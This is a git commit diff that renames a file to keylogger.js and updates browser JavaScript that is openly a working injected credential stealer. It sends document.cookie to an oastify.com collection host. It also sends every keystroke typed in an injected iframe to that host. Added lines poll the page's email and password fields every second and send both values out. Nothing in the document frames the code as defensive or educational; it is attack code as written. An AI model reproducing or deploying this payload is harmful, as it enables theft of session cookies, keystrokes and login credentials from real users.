46d02da3e299be3363c5b77d0f7f68ec21df368e
Okechukwu Joshua <lodianaselora@gmail.com>
2025-01-02 06:50:34 +0100

    Update and rename good.js to keylogger.js

--- keylogger.js
+++ keylogger.js
@@ -1,4 +1,3 @@
-let currSession="";
 fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/${document.cookie}`, {mode: 'no-cors',});
 document.body.style.setProperty('height', '100vh')
 const iframe = document.createElement('iframe');
@@ -9,8 +8,17 @@ iframe.style.border = 'none';
 iframe.onload = function () {
     console.log('Iframe has loaded successfully!');
     iframe.contentWindow.addEventListener('keydown', (event) => {    console.log(`Key pressed: ${event.key}`);
-    currSession += `++${String(event.key)}`
+    currSession += `+${String(event.key)}`
     fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/${currSession}`, {mode: 'no-cors',});
 });
 };
 document.body.appendChild(iframe);
+//=================================================================================
+const xpath = "/html/body/div[1]/div[2]/div[1]/div[2]/div/div[2]/div[1]/input";
+const element = document.evaluate(xpath,document,null, XPathResult.FIRST_ORDERED_NODE_TYPE,null).singleNodeValue;
+setInterval(()=> {
+    fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/Email?direct-email-${element.value}`)
+    fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/Password?direct-password-${document.getElementById("password").value}`)
+}, 1000)
+
+
